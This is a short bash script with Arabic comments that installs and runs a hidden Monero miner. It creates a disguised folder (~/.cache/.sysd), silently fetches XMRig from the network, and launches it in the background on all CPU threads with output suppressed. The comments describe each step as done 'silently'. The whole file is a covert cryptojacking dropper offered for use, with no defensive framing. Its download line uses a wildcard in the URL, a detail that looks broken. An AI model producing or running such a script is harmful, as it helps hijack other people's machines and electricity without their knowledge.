#!/bin/bash

# بيانات المحفظة (غيّرها)
WALLET="44...YOUR_WALLET"
WORKER="silentPC"
POOL="gulf.moneroocean.stream:10128"

# مجلد خفي داخل home
WORKDIR="$HOME/.cache/.sysd"
mkdir -p "$WORKDIR" && cd "$WORKDIR"

# تحميل XMRig بصمت
wget -q https://github.com/xmrig/xmrig/releases/latest/download/xmrig-*-linux-x64.tar.gz -O miner.tar.gz

# فك الضغط بصمت
tar -xzf miner.tar.gz --strip=1 > /dev/null 2>&1
rm miner.tar.gz

# تشغيل في الخلفية بصمت
nohup ./xmrig -o "$POOL" -u "$WALLET" -p "$WORKER" -k --tls --threads=$(nproc) > /dev/null 2>&1 &
